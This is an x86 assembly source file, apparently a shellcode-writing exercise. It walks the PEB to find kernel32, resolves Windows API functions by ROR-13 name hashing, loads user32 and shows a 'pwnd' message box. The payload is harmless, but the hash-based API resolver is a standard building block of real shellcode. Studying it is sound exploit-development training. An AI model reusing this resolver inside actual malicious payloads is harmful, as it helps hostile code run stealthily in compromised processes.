.386    ; enable 32-bit programming features
.model flat, stdcall    ;flat model programming/stdcall convention
assume fs:flat

.data   ; start data section

.code   ; start code section

start:
    jmp entry
entry:
    sub esp, 60h
    mov ebp, esp
    call find_kernel32
resolve_symbols_kernel32:
    push 0ec0e4e8eh ; LoadLibraryA hash
    push edi
    call find_function
    mov [ebp + 10h], eax    ; store function addy on stack
    ; resolve exitProcess
    push 73e2d87eh  ; exitProcess hash
    push edi
    call find_function
    mov [ebp + 1ch], eax    ; store function addy on stack
resolve_symbols_user32: ; load user32.dll in memory
    xor eax, eax
    mov ax, 3233h
    push eax
    push 72657375h
    push esp    ; pointer to 'user32'
    call dword ptr [ebp + 10h]  ; call LoadLibraryA
    mov edi, eax    ; edi -> user32.dll base
    ; Resolve MessageBoxA
    push 0bc4da2a8h
    push edi
    call find_function
    mov [ebp + 18h], eax    ; store function addy on stack
exec_shellcode:
    ; Call "pwnd" MessageBoxA
    xor eax, eax
    push eax    ; pwnd string
    push 646e7770h  ; pwnd string
    push esp    ; pointer to pwnd
    pop ecx ; store pointer in ecx
; Push MessageBoxA args in reverse order
    push eax
    push ecx
    push ecx
    push eax
    ; Call MessageBoxA
    call dword ptr [ebp + 18h]
    ; Call exitProcess
    xor ecx, ecx    ; zero ecx
    push ecx    ; Exit Reason
    call dword ptr [ebp + 1ch]

find_kernel32:
    xor eax, eax
    mov eax, fs:[eax+30h]
    mov eax, [eax+0ch]
    mov esi, [eax+1ch]
    lodsd
    mov edi, [eax+08h]
    ret
find_function:
    pushad  ; Save all registers
    mov ebp, edi ; Take the base address of kernel32 and put it in ebp
    mov eax, [ebp + 3ch] ; Offset to PE signature VMA
    mov edi, [ebp + eax + 78h]  ; Export table relative Offset
    add edi, ebp    ; Export Table VMA
    mov ecx, [edi + 18h]    ; Number of names
    mov ebx, [edi + 20h]    ; Names table relative Offset
    add ebx, ebp    ; Names table VMA
find_function_loop:
    jecxz find_function_finished    ; Jump to end if ecx equals 0
    dec ecx ; Decrement our names register
    mov esi, [ebx + ecx * 4]    ; Store the relative offset of the name
    add esi, ebp    ; Set ESI to the VMA of the current name
compute_hash:
    xor eax,eax ; Zero eax
    cdq ; Zero edx
    cld ; Clear direction
compute_hash_again:
    lodsb   ; Load the next byte from esi into al
    test al, al ; Test ourselves
    jz compute_hash_finished    ; if ZF is set, we've hit the null terminator
    ror edx, 0dh    ;   Rotate edx 13 bits to the right
    add edx, eax    ;   Add the new byte to the accumulator
    jmp compute_hash_again  ;   next iteration
compute_hash_finished:
find_function_compare:
    cmp edx, [esp + 28h]    ;   Compare the computed hash with the requested hash
    jnz find_function_loop  ;   No match, try the next one
    mov ebx, [edi + 24h]    ; Ordinals table relative offset
    add ebx, ebp    ;   Ordinals Table VMA
    mov cx, [ebx + 2 * ecx] ; Extrapolate the function's Ordinal
    mov ebx, [edi + 1ch]    ;   Address table's relative offset
    add ebx, ebp    ; Address table VMA
    mov eax, [ebx + 4 * ecx]    ; Extract the relative function offset from its Ordinal
    add eax, ebp    ; Function VMA
    mov [esp + 1ch], eax    ;   Overwrite stack version of eax from pushad
find_function_finished:
    popad   ; restore all registers
    ret ; return

end start

END